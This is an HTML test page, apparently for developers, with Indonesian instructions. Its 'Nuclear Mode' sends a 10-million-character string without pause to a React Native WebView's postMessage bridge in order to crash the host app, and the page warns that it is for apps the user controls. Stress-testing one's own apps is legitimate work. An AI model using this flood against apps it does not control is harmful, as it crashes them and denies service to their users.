<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>ReactNativeWebView Crash Test - Nuclear Mode</title>
<style>
body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
button { margin: 5px 0; padding: 10px 15px; font-size: 14px; }
pre { background: #000; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
</style>
</head>
<body>

<h2>ReactNativeWebView Crash Test</h2>
<p>Gunakan <b>Mode Nuklir</b> hanya di aplikasi yang kamu kuasai. Ini akan mengirim payload raksasa tanpa henti.</p>

<button onclick="startNuclear()">ðŸš¨ Start Nuclear Mode</button>
<button onclick="stopNuclear()">ðŸ›‘ Stop</button>

<pre id="log"></pre>

<script>
const log = msg => document.getElementById("log").textContent += "\n" + msg;

function post(msg) {
    try {
        if (window.ReactNativeWebView) {
            window.ReactNativeWebView.postMessage(msg);
        } else {
            log("ReactNativeWebView not detected.");
        }
    } catch (e) {
        log("Error: " + e.message);
    }
}

function sendLongString() {
    const payload = "A".repeat(10_000_000);
    post(payload);
}

let nuclearActive = false;

function startNuclear() {
    if (nuclearActive) return;
    nuclearActive = true;
    log("ðŸš¨ Nuclear Mode started!");
    (function loop() {
        if (!nuclearActive) return;
        sendLongString();
        requestAnimationFrame(loop); // tanpa delay
    })();
}

function stopNuclear() {
    nuclearActive = false;
    log("ðŸ›‘ Nuclear Mode stopped.");
}
</script>

</body>
</html>
